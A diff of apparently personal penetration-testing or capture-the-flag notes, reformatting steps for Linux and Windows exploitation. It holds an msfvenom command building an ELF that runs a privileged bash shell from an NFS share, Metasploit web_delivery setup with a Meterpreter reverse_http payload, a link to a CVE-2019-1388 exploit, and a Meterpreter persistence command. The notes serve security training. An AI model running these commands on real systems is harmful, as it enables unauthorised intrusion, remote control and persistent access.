@@ -46,19 +46,17 @@ generate a payload using msfvenom callnig /bin/bash:
 
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 
-* Exploit target when showing options
-  * show targets
-  * set target 2
 
 Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
 
 * set target
 * https://github.com/nobodyatall648/CVE-2019-1388
-* Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. 
+* A simple reverse HTTP payload.
+  * 'set payload windows/meterpreter/reverse_http'.
 * Following this, launch the attack as a job with the command 'run -j'.
   * jobs
   * jobs -i 0
-* paste the command output by Metasploit
+  * paste the command output by Metasploit
 * https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
 * run persistence -X
 
